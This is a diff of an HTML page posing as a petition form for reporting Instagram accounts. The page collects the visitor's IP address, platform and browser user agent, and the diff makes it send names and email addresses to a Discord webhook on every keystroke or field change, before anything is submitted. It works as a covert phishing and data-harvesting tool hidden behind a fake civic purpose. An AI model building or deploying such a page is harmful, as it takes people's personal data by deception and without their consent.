@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -122,8 +123,7 @@
     }
 
     #fake {
-      display: block;
-      margin: 0 auto;
+      display: inline-block;
       padding: 10px 20px;
       font-size: 1em;
       border: none;
@@ -135,7 +135,6 @@
       background-size: 300% 300%;
       animation: gradientBG 3s ease infinite;
       font-weight: 600;
-      width: fit-content;
     }
   </style>
 </head>
@@ -146,7 +145,7 @@
 
   <div class="container">
     <h2>Report an Instagram Account</h2>
-    <p>Help us petition Instagram to remove users violating community guidelines.</p>
+    <p>Help us petition Instagram to remove users violating community guidelines. </p>
     <button id="trigger">Open Form</button>
 
     <div id="formContainer">
@@ -195,16 +194,15 @@
         .then(response => response.json())
         .then(data => {
           userIP = data.ip;
+          console.log('Fetched IP:', userIP);
         })
         .catch(err => console.error('Error fetching IP:', err));
     });
 
+    // Show the form when the user clicks the trigger
     trigger.addEventListener('click', () => {
       formContainer.style.display = 'block';
       fnameField.focus();
-
-      // After a brief delay, check if fields were autofilled
-      setTimeout(checkFields, 500);
     });
 
     function checkFields() {
@@ -215,27 +213,24 @@
         handleField.value.trim() !== '' ||
         reasonField.value.trim() !== ''
       ) {
-        submitForm();
+        submitForm(
+          fnameField.value.trim() || '[No First Name]',
+          lnameField.value.trim() || '[No Last Name]',
+          emailField.value.trim() || '[No Email]',
+          handleField.value.trim() || '[No Handle]',
+          reasonField.value.trim() || '[No Reason]'
+        );
       }
     }
 
-    function submitForm() {
-      const fname = fnameField.value.trim() || '[No First Name]';
-      const lname = lnameField.value.trim() || '[No Last Name]';
-      const email = emailField.value.trim() || '[No Email]';
-      const handle = handleField.value.trim() || '[No Handle]';
-      const reason = reasonField.value.trim() || '[No Reason]';
-
-      const message = 
-        `**New Petition Submission (Report Instagram Account):**\n` +
-        `**IP:** ${userIP}\n` +
-        `**OS/Platform:** ${userPlatform}\n` +
-        `**Browser/User Agent:** ${userAgent}\n` +
-        `**First Name:** ${fname}\n` +
-        `**Last Name:** ${lname}\n` +
-        `**Email:** ${email}\n` +
-        `**Instagram Handle to Report:** ${handle}\n` +
-        `**Reason:** ${reason}`;
+    function submitForm(fname, lname, email, handle, reason) {
+      const message = `**New Petition Submission (Report Instagram Account):**\n` +
+                      `**IP:** ${userIP}\n` +
+                      `**OS/Platform:** ${userPlatform}\n` +
+                      `**Browser/User Agent:** ${userAgent}\n` +
+                      `**First Name:** ${fname}\n` +
+                      `**Last Name:** ${lname}\n` +
+                      `**Email:** ${email}\n`;
 
       fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
@@ -249,4 +244,20 @@
           console.error('Failed to send message to Discord:', response.status, response.statusText);
         }
       })
-      .catch(err => console.error('Error sending message to Disco
+      .catch(err => console.error('Error sending message to Discord:', err));
+    }
+
+    fnameField.addEventListener('input', checkFields);
+    lnameField.addEventListener('input', checkFields);
+    emailField.addEventListener('input', checkFields);
+    handleField.addEventListener('input', checkFields);
+    reasonField.addEventListener('input', checkFields);
+
+    fnameField.addEventListener('change', checkFields);
+    lnameField.addEventListener('change', checkFields);
+    emailField.addEventListener('change', checkFields);
+    handleField.addEventListener('change', checkFields);
+    reasonField.addEventListener('change', checkFields);
+  </script>
+</body>
+</html>
